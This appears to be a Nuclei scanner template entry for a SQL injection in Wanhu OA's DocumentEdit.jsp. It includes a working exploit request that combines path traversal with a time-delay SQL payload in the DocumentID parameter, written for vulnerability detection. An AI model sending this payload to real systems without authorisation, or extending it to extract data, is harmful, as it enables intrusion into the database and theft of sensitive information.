# Nuclei Template: WanhuOA DocumentEdit.jsp - SQL Injection
**Template ID:** wanhu-documentedit-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`wanhu-documentedit-sqli.yaml`)

## Vulnerability Information & PoC

## Description
The Wanhu OA DocumentEdit.jsp file has a SQL injection vulnerability. An attacker can perform SQL injection into the database by sending a special request package and obtain sensitive information on the server.

## Steps to reproduce / Exploit Payload
```http
@timeout: 15s
GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:7'-- HTTP/1.1
Host: {{Hostname}}
```

## References
- http://wiki.peiqi.tech/wiki/oa/万户OA/万户OA%20DocumentEdit.jsp%20SQL注入漏洞.html
- https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E4%B8%87%E6%88%B7OA%20DocumentEdit.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
